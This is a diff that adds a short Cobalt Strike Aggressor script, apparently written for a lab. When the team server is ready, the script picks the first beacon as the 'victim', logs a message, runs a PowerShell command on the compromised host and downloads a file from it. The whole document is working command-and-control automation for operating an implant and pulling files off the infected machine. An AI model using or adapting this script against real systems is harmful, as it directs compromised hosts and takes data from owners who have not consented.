@@ -1,0 +1,9 @@
+on ready {
+  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners() . "\n");
+  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing beacons: " . beacons() . "\n");
+  $victim = beacons()[0]['id'];
+  println('Target beacon ID: ' . $victim)
+  blog($victim, 'Start C2 scripts ...');
+  bpowershell($victim, '$PSVersionTable');
+  bdownload($victim, 'C:\\vagrant\\cobaltstrike-4.4.zip');
+}
